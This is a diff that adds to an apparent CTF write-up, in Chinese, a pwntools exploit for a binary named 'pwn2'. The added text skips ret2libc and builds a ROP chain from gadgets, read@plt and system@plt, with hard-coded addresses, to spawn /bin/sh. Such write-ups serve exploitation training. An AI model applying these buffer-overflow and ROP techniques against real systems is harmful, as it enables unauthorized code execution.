@@ -41,3 +41,36 @@ p.interactive()
 
 比賽時在local測試一直不行，找不出原因(ubuntu18.04)。
 後來用16.04才發現local可以，但是也無法連到遠端測試了
+
+---
+
+ret2libc 行不通，因為不知道遠 libc 位置 ， 直接串 ROP即可
+
+```python
+from pwn import *
+
+r = process("./pwn2")
+
+offset = 'a'*16
+pop_rsi_r15_ret = p64(0x4006d1)
+pop_rdi_ret = p64(0x4006d3)
+
+read_plt = p64(0x4004f0)
+buf = p64(0x601100) # 找一塊有寫入權限的位置來使用
+system_plt = p64(0x4004e0)
+magic = p64(0x4005f7)
+
+
+payload = flat([offset,
+                pop_rsi_r15_ret,
+                buf,
+                'a' * 8,
+                read_plt,
+                pop_rdi_ret,
+                buf,
+                system_plt,
+                "/bin/sh\x00"])
+
+r.sendline(payload)
+r.interactive()
+```
